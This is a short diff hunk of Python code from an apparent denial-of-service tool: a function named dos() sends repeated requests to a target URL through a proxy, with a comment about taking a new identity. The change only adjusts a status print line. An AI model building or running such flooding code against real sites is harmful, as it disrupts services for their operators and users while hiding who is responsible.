@@ -56,10 +56,8 @@ async def dos(url: str, proxy_host: str, proxy_port: str, worker: int):
 
         for index in range(8):
             async with session.get(url, headers=headers) as response:
-                # print(f'#{worker + 1} Worker | Request to {re.sub(PROTOCOL_PATTERN, "", url)} has a {response.status} status code (IP await {response.text()})')
+                print(f'#{worker + 1} Worker | Request to {re.sub(PROTOCOL_PATTERN, "", url)} has a {response.status} status code')
                 
-                ...
-
         await session.close()
 
         # New identity
